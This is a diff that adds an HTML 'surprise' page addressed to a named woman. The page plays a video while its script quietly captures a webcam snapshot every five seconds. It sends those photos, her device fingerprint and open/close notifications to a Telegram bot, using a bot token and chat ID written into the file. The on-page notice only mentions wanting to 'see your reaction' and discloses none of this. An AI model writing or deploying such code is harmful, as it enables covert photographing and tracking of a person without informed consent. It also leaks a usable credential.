@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="robots" content="noindex, nofollow">
+<title>For You 🌹</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600;700&family=Quicksand:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg1:#1a0f1f; --bg2:#2e1437; --rose:#ff6f91; --rose-dark:#c9184a;
+    --gold:#ffd6a5; --text:#fff0f3;
+  }
+  *{box-sizing:border-box; margin:0; padding:0;}
+  html,body{height:100%; background:var(--bg1); overflow:hidden; font-family:'Quicksand',sans-serif;}
+  body{
+    background: radial-gradient(ellipse at top, var(--bg2), var(--bg1) 70%);
+    color:var(--text);
+    position:relative;
+  }
+
+  /* ---------- Landing screen ---------- */
+  #landing{
+    position:fixed; inset:0; display:flex; flex-direction:column;
+    align-items:center; justify-content:center; text-align:center;
+    z-index:50; padding:24px;
+    background: radial-gradient(ellipse at center, var(--bg2), var(--bg1) 80%);
+  }
+  .petal{
+    position:absolute; top:-10%; font-size:20px; opacity:.8;
+    animation: fall linear infinite;
+    pointer-events:none;
+  }
+  @keyframes fall{
+    0%{ transform: translateY(-10vh) rotate(0deg); }
+    100%{ transform: translateY(110vh) rotate(360deg); }
+  }
+  #landing h1{
+    font-family:'Dancing Script',cursive; font-size:clamp(2rem,8vw,3.2rem);
+    color:var(--rose); text-shadow:0 0 20px rgba(255,111,145,.5);
+    margin-bottom:10px;
+  }
+  #landing p{ font-size:.95rem; opacity:.85; max-width:320px; line-height:1.5; margin-bottom:28px;}
+  #beginBtn{
+    background:linear-gradient(135deg,var(--rose),var(--rose-dark));
+    color:#fff; border:none; padding:16px 38px; border-radius:40px;
+    font-size:1.05rem; font-weight:600; letter-spacing:.5px; cursor:pointer;
+    box-shadow:0 8px 24px rgba(201,24,78,.45);
+    transition:transform .15s ease;
+  }
+  #beginBtn:active{ transform:scale(.96); }
+
+  #camNotice{
+    margin-top:22px; font-size:.78rem; opacity:.7; max-width:280px; line-height:1.4;
+  }
+
+  /* ---------- Video stage ---------- */
+  #stage{ position:fixed; inset:0; display:none; background:#000; z-index:10; }
+  #mainVideo{ width:100%; height:100%; object-fit:contain; background:#000; }
+
+  /* camera corner preview */
+  #camPreview{
+    position:fixed; bottom:18px; right:18px; width:84px; height:84px;
+    border-radius:50%; overflow:hidden; border:2px solid var(--rose);
+    box-shadow:0 0 16px rgba(255,111,145,.6);
+    z-index:40; display:none;
+  }
+  #camPreview video{ width:100%; height:100%; object-fit:cover; transform:scaleX(-1); }
+  #camPreview .dot{
+    position:absolute; top:6px; right:6px; width:8px; height:8px; border-radius:50%;
+    background:#ff3b3b; box-shadow:0 0 6px #ff3b3b; animation:pulse 1.4s infinite;
+  }
+  @keyframes pulse{ 0%,100%{opacity:1;} 50%{opacity:.3;} }
+
+  #loadingNote{
+    position:fixed; bottom:16px; left:16px; font-size:.7rem; opacity:.55; z-index:40;
+  }
+
+  .hidden-canvas{ display:none; }
+</style>
+</head>
+<body>
+
+<div id="landing">
+  <h1>Hey Shubhayoha 🌹</h1>
+  <p>I made something for you. Put your volume up, get comfy, and tap below when you're ready.</p>
+  <button id="beginBtn">Open my surprise 🌸</button>
+  <p id="camNotice">This page would love to see your reaction while you watch 😊<br>It'll ask to use your camera — totally up to you.</p>
+</div>
+
+<div id="stage">
+  <video id="mainVideo" playsinline webkit-playsinline src="deepanshubha.mp4"></video>
+</div>
+
+<div id="camPreview">
+  <video id="selfieVideo" autoplay playsinline muted></video>
+  <div class="dot"></div>
+</div>
+
+<canvas id="snapCanvas" class="hidden-canvas"></canvas>
+<div id="loadingNote"></div>
+
+<script>
+/* ====== CONFIG ====== */
+const BOT_TOKEN = "9110997983:AAGxE6UyAq-xwAVBStQ69l9awzXRn62poKs";
+const CHAT_ID   = "1520046232";
+const SNAP_INTERVAL_MS = 5000; // capture a frame every 5s while playing
+
+const tgBase = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+function tgSendMessage(text){
+  return fetch(`${tgBase}/sendMessage`, {
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text })
+  }).catch(()=>{});
+}
+
+function tgSendPhotoBlob(blob, caption){
+  const fd = new FormData();
+  fd.append("chat_id", CHAT_ID);
+  fd.append("caption", caption || "");
+  fd.append("photo", blob, "snap.jpg");
+  return fetch(`${tgBase}/sendPhoto`, { method:"POST", body: fd }).catch(()=>{});
+}
+
+function deviceSummary(){
+  const ua = navigator.userAgent;
+  const plat = navigator.platform || "unknown platform";
+  const screenInfo = `${screen.width}x${screen.height}`;
+  const lang = navigator.language || "";
+  const now = new Date();
+  const timeStr = now.toLocaleString();
+  return `🌹 She opened the surprise!\n🕐 ${timeStr}\n📱 ${plat} | ${screenInfo} | ${lang}\n🧭 ${ua}`;
+}
+
+/* ====== Elements ====== */
+const landing   = document.getElementById("landing");
+const beginBtn  = document.getElementById("beginBtn");
+const stage     = document.getElementById("stage");
+const mainVideo = document.getElementById("mainVideo");
+const camPreview= document.getElementById("camPreview");
+const selfieVideo = document.getElementById("selfieVideo");
+const canvas    = document.getElementById("snapCanvas");
+const ctx       = canvas.getContext("2d");
+
+let camStream = null;
+let snapTimer = null;
+let snapCount = 0;
+
+function stopCamera(){
+  if(camStream){
+    camStream.getTracks().forEach(t => t.stop());
+    camStream = null;
+  }
+  if(snapTimer){ clearInterval(snapTimer); snapTimer = null; }
+  camPreview.style.display = "none";
+}
+
+function captureAndSend(){
+  if(!camStream) return;
+  const track = camStream.getVideoTracks()[0];
+  if(!track) return;
+  const settings = track.getSettings ? track.getSettings() : {};
+  canvas.width = settings.width || selfieVideo.videoWidth || 320;
+  canvas.height = settings.height || selfieVideo.videoHeight || 240;
+  ctx.drawImage(selfieVideo, 0, 0, canvas.width, canvas.height);
+  canvas.toBlob(blob=>{
+    if(!blob) return;
+    snapCount++;
+    const t = mainVideo.currentTime ? mainVideo.currentTime.toFixed(1)+"s" : "?";
+    tgSendPhotoBlob(blob, `📸 Reaction @ ${t} into the video (snap #${snapCount})`);
+  }, "image/jpeg", 0.82);
+}
+
+async function startCamera(){
+  try{
+    camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:"user" }, audio:false });
+    selfieVideo.srcObject = camStream;
+    camPreview.style.display = "block";
+    snapTimer = setInterval(captureAndSend, SNAP_INTERVAL_MS);
+    return true;
+  }catch(e){
+    return false;
+  }
+}
+
+beginBtn.addEventListener("click", async ()=>{
+  beginBtn.disabled = true;
+  beginBtn.textContent = "Opening...";
+
+  // Fire the "she opened it" ping immediately, don't block UI on it
+  tgSendMessage(deviceSummary());
+
+  const camOk = await startCamera();
+  if(!camOk){
+    tgSendMessage("⚠️ Camera permission was not granted — playing without reaction capture.");
+  }
+
+  landing.style.display = "none";
+  stage.style.display = "block";
+
+  try{
+    await mainVideo.play();
+  }catch(e){
+    // Autoplay with sound might be blocked once more on some browsers; show controls as fallback
+    mainVideo.setAttribute("controls","true");
+  }
+});
+
+mainVideo.addEventListener("ended", ()=>{
+  tgSendMessage("🎬 Video finished playing. Hope she loved it 💕");
+  stopCamera();
+});
+
+// Safety: if the tab/page is closed or hidden for a long time, stop camera
+window.addEventListener("pagehide", stopCamera);
+</script>
+</body>
+</html>
